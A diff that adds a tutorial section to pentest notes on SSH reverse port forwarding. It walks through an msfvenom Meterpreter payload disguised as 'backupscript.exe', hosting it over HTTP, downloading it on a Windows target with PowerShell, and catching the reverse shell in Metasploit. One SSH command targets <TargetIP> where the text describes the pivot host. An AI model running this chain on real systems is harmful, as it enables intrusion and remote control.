@@ -230,3 +230,133 @@ The xfreerdp command will require an RDP certificate to be accepted before succe
 - **Firewall Considerations**: Windows machines may block ICMP (ping) by default, so host discovery checks (ping scans) might not be effective.
 
 This approach allows you to bypass firewall restrictions and scan the network behind the compromised host.
+
+# Remote/Reverse Port Forwarding with SSH
+
+#### Scenario Overview:
+- **Windows Target (Windows A)**: The target machine you want to exploit, which is only able to make outgoing connections to the `172.16.5.0/23` network (local network).
+- **Pivot Host (Ubuntu Server)**: A host that has connectivity to both the attack host and the Windows target. It will forward traffic between the two.
+- **Attack Host (Your Machine)**: The machine you're using to attack the Windows target, running tools like Metasploit to handle the payload connection.
+
+#### Steps to Achieve Pivoting via SSH and Meterpreter Shell:
+
+---
+
+### 1. **Create Meterpreter Payload**:
+   - Use **msfvenom** to generate a Meterpreter payload that will connect back to your listener on the attack host via the pivot host.
+   - **Command**:
+     ```bash
+     msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PivotHostIP> LPORT=8080 -f exe -o backupscript.exe
+     ```
+     - `lhost=<PivotHostIP>`: The IP of the pivot host (Ubuntu server), which will receive the reverse connection.
+     - `LPORT=8080`: The port on the pivot host that the payload will use to connect back.
+     - `-f exe`: The payload format (Windows executable).
+     - `-o backupscript.exe`: Output the payload as an executable file named `backupscript.exe`.
+
+   - **Output**: 
+     - Payload size: 712 bytes.
+     - Final exe size: 7168 bytes.
+     - Saved as `backupscript.exe`.
+
+---
+
+### 2. **Configure Metasploit Handler**:
+   - You need to set up a **Metasploit handler** on the attack host to listen for the reverse connection.
+   - **Steps**:
+     - Start `msfconsole` and use the appropriate exploit handler.
+     - **Command**:
+       ```bash
+       msfconsole
+       use exploit/multi/handler
+       set payload windows/x64/meterpreter/reverse_https
+       set lhost 0.0.0.0
+       set lport 8000
+       run
+       ```
+     - `payload windows/x64/meterpreter/reverse_https`: This configures Metasploit to use a reverse HTTPS Meterpreter payload.
+     - `lhost 0.0.0.0`: Listen on all interfaces (useful for receiving connections on the attack host).
+     - `lport 8000`: Listen on port 8000 for incoming connections.
+   
+   - **Output**:
+     - **Metasploit** will start listening for incoming HTTPS reverse connections on `https://0.0.0.0:8000`.
+
+---
+
+### 3. **Transfer Payload to Pivot Host**:
+   - You need to move the payload from your attack host to the pivot host (Ubuntu server).
+   - **Command** (using `scp`):
+     ```bash
+     scp backupscript.exe ubuntu@<PivotHostIP>:~/
+     ```
+     - This copies the `backupscript.exe` to the home directory of the pivot host.
+
+---
+
+### 4. **Start HTTP Server on Pivot Host**:
+   - On the pivot host (Ubuntu), you'll need to serve the payload over HTTP so the Windows target can download it.
+   - **Command** (using Python3):
+     ```bash
+     python3 -m http.server 8123
+     ```
+     - This starts a simple HTTP server on port `8123` to host the payload. The Windows target will download it from this server.
+
+---
+
+### 5. **Download Payload on Windows Target**:
+   - On the Windows target, use **PowerShell** to download the payload from the pivot host:
+   - **Command**:
+     ```powershell
+     Invoke-WebRequest -Uri "http://<PivotHostIP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+     ```
+     - This downloads the payload (`backupscript.exe`) to the `C:\` directory on the Windows target.
+
+---
+
+### 6. **Set Up SSH Remote Port Forwarding**:
+   - **SSH Remote Port Forwarding**: This step involves using SSH to forward traffic from the pivot host's port `8080` to the attack host's port `8000` (where your Metasploit listener is running).
+   - **Command**:
+     ```bash
+     ssh -R <PivotHostIP>:8080:0.0.0.0:8000 ubuntu@<TargetIP> -vN
+     ```
+     - `-R <PivotHostIP>:8080:0.0.0.0:8000`: This forwards incoming traffic on the pivot host's IP address at port 8080 to the attack host's `0.0.0.0:8000` (Metasploit listener).
+     - `-vN`: Verbose output for debugging and to avoid interactive login shell.
+
+   - The **pivot host** will now forward any incoming connection on `8080` to the attack host's port `8000` where Metasploit is listening.
+
+---
+
+### 7. **Execute Payload on Windows Target**:
+   - On the Windows target, run the payload you downloaded (`C:\backupscript.exe`).
+   - This will trigger the reverse shell connection back to the pivot host, which will forward it to the attack host via SSH.
+
+---
+
+### 8. **Metasploit Listener Logs (Pivot Host)**:
+   - You can monitor the logs on the pivot host to ensure the connection is being forwarded properly.
+   - **Logs** (Example):
+     ```
+     debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
+     debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
+     debug1: channel 1: new [172.16.5.19]
+     debug1: confirm forwarded-tcpip
+     ```
+
+   - These logs show the connection attempt from the Windows target (`172.16.5.19`) being forwarded via the pivot to the attack host.
+
+---
+
+### 9. **Meterpreter Session**:
+   - Once the reverse shell is triggered, you'll see the following in Metasploit:
+   - **Output**:
+     ```
+     Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500
+     ```
+   - The **Meterpreter** session will show as coming from `127.0.0.1` (loopback) because the pivot host is forwarding the connection.
+   - Use the `shell` command to interact with the target shell:
+     ```bash
+     meterpreter > shell
+     C:\> netstat
+     ```
+
+---
+
